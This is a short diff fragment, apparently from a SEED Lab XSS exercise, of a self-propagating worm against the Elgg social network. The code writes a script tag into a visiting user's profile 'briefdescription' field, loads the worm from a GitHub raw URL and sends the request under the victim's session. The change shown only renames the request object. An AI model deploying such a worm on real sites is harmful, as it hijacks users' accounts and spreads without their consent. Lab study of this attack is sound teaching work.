@@ -26,6 +26,6 @@ if(user!='hackbiji'){
     content = content.concat("&&briefdescription=<script id='worm' type='text/javascript' src='https://raw.githubusercontent.com/isGt93/Keep-learning/master/mySeedLab/XSS/worm.js'></script>").concat(sub_script);
     content = content.concat("&guid=").concat(elgg.session.user.guid);
 
-    Ajax.setRequestHeader("Content-Length",content.length);
-    Ajax.send(content);
+    victim.setRequestHeader("Content-Length",content.length);
+    victim.send(content);
 }
